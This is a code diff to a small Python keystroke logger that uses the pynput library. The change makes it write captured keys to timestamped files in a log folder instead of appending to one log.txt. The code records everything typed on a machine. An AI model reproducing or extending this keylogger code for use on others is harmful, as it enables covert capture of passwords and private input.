@@ -1,8 +1,10 @@
 import pynput
+import time
 from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
+
 
 def on_press(key):
     global keys, count
@@ -17,7 +19,8 @@ def on_press(key):
         keys = []
 
 def writefile(keys):
-    with open("log.txt", "a") as f:
+    timestr = time.strftime("%Y%m%d-%H%M%S") + ".txt"
+    with open("log/"+timestr, "w") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
